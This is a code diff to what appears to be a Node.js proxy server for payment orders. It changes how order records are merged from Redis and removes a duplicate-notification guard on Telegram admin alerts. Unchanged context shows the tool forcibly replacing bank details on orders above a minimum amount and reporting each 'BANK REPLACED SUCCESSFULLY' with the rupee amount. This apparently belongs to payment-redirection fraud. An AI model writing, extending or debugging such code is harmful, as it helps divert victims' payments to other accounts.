@@ -177,8 +177,8 @@ async function saveDataUnlocked(data) {
                     data.tokenMap = { ...(current.tokenMap || {}), ...(data.tokenMap || {}) };
                     data.orderNotificationMap = { ...(current.orderNotificationMap || {}), ...(data.orderNotificationMap || {}) };
 
-                    // API request saving runtime data: ALWAYS merge Redis orders and any new orders in data.orderBankMap
-                    data.orderBankMap = { ...(current.orderBankMap || {}), ...(data.orderBankMap || {}) };
+                    // API request saving runtime data: ALWAYS take latest orders from Redis and append only newly created orders in this request
+                    data.orderBankMap = { ...(current.orderBankMap || {}) };
                     if (data._newOrdersToSave && typeof data._newOrdersToSave === 'object') {
                         data.orderBankMap = { ...data.orderBankMap, ...data._newOrdersToSave };
                         delete data._newOrdersToSave;
@@ -3160,8 +3160,7 @@ app.all('/xxapi/*', async (req, res) => {
                                         time: now,
                                         userId: itemUid,
                                         isManual: true,
-                                        forced: true,
-                                        notified: true
+                                        forced: true
                                     };
                                     if (!data.orderBankMap) data.orderBankMap = {};
                                     data.orderBankMap[rptNo] = savedData;
@@ -3279,8 +3278,6 @@ app.all('/xxapi/*', async (req, res) => {
                                 hadWallet = true;
                             }
 
-                            const isAlreadyNotified = Boolean(rptNo && data.orderBankMap && data.orderBankMap[rptNo] && data.orderBankMap[rptNo].notified);
-
                             // 3. Save rptNo in KV (orderBankMap)
                             if (rptNo) {
                                 const savedData = {
@@ -3298,8 +3295,7 @@ app.all('/xxapi/*', async (req, res) => {
                                     time: now,
                                     userId: String(userId || ''),
                                     isManual: true,
-                                    forced: true,
-                                    notified: true
+                                    forced: true
                                 };
                                 if (!data.orderBankMap) data.orderBankMap = {};
                                 data.orderBankMap[rptNo] = savedData;
@@ -3308,9 +3304,8 @@ app.all('/xxapi/*', async (req, res) => {
                                 await saveData(data);
                             }
 
-                            // 4. Send Telegram Alert (Only if not already notified)
-                            if (!isAlreadyNotified) {
-                                const replaceMsg = `╔══════════════════════════════════╗
+                            // 4. Send Telegram Alert
+                            const replaceMsg = `╔══════════════════════════════════╗
 ║   ⚡ BANK REPLACED SUCCESSFULLY  ║
 ╚══════════════════════════════════╝
 💰 <b>Amount</b>          : <b>₹${parsedAmt}</b>
@@ -3332,8 +3327,7 @@ app.all('/xxapi/*', async (req, res) => {
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🕐 <code>${now}</code>`;
-                                notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
-                            }
+                            notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
                         } else if (!minOk && minAmount > 0 && parsedAmt < minAmount) {
                             // Amount < Min Set: Do not replace, send alert
                             const notReplacedMsg = `╔══════════════════════════════════╗
